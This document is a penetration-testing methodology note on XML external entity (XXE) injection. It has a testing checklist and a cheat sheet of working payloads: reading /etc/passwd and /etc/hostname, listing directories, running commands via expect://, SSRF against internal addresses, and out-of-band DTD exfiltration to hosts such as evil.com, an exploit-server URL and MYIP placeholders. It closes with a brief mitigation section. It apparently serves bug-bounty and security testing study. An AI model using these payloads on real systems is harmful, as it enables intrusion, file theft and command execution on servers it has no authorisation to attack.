---
title: "XXE"
layout: notes
tags:
  - webapp
  - methodology
  - xxe
  - FI_file-upload
  - FI_image-upload
  - FI_parameters
  - Co_reading-files
  - Co_ssrf
  - Co_dos
  - Co_rce
---
## Summary

Extensible markup language (XML) is a language designed for storing and transporting data. It uses a tree-like structure of tags and data. Tags are not rigidly defined and can be treated closer to variables to describe the corresponding data. Within this document type exists ways to import internal and external definitions to help structure data and are declared with `DOCTYPE`. External entities can be added through DTDs or defined within XML to real local files and exfiltrate data. Crossover episode for SSRF - Server Side Request Forgery and could be accentuated with File Upload. 

## Methodology

When looking for XXE vulnerabilities ask/try the following:
- [ ] **Do I control any XML or HTML to the application?**
- [ ] **Can I Upload DOCX SVG XML or PDF files?**
	- [ ] try SVG in image upload locations
- [ ] add `&notdefined;` to test if XML is being parsed
- [ ] try defining an XXE to read a common file `/etc/hostname`
- [ ] try placing the entity in each node and tag
- [ ] try an XInclude payload
- [ ] try replacing JSON with XML
- [ ] try changing the `Content-Type` to `application/xml` then convert data
	- [ ] `foo=bar --> <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>`
- [ ] try encoding certain characters
- [ ] try an out-of-band file grab
	- [ ] if you have out-of-band try defining a DTD
- [ ] try a parsing error-based file retrieval
- [ ] try finding a local DTD and redefining an entity
	- [ ] scan for local DTDs by defining one to load and no error means success
	- [ ] only works in a hybrid environment of external and internal DTDs

<br>
IF XXE HAS BEEN FOUND
- [ ] try to perform SSRF on local IPs or intranets
- [ ] try to get command execution

## Capabilities

Reading files  
SSRF  
DoS  
Remote Code execution  

## Found In

Image Uploads  
File Uploads  
Parameters  

## Tools/Examples

[https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md)

basic test
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe "test"> ]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

basic file read & oob test
```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM  "http://evil.com" >]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

parameter entity
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM  "file:///etc/passwd"> %xxe; ]>
```

list file (JAVA only)
```
<!--?xml version="1.0" ?-->
<!DOCTYPE aa[<!ELEMENT bb ANY>
<!ENTITY xxe SYSTEM "file:///">]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

run code (PHP only)
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<foo>
    <bar>&xxe;</bar>
</foo>
```

basic file read + version
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [   
<!ELEMENT foo ANY >   
<!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

xinclude
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```

ssrf or redirect
```
<?xml  version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [   
<!ELEMENT foo ANY >   
<!ENTITY ext SYSTEM  "http://192.168.1.1/admin" >]>
<foo>&ext;</foo>
```

svg xxe
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

dtd file exfiltration
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval  "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0ac600c7044b74d482e30635019d001f.exploit-server.net/?hostname=%file;'>"> 
%eval; 
%exfil;
```

dtd error exfiltration
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> 
%eval; 
%error;
```

blind out-of-band xxe
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://myip"> ]>
<foo>&xxe;</foo>
```

blind out-of-band error exfiltration
```
exploit.dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://MYIP.com/?x=%file;'>"> 
%eval; 
%exfiltrate;
```
add in xml
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://myip/exploit.dtd"> %xxe; ]>
```

repurposing local DTDs
gnome desktop: `/usr/share/yelp/dtd/docbookx.dtd`
```
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> 
<!ENTITY % entiry_overwrite_name ' 
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> 
&#x25;eval; 
&#x25;error; 
'> 
%local_dtd; 
]>
```

#### Mitigation

Disable resolution of external entities  
Disable support for XInclude  




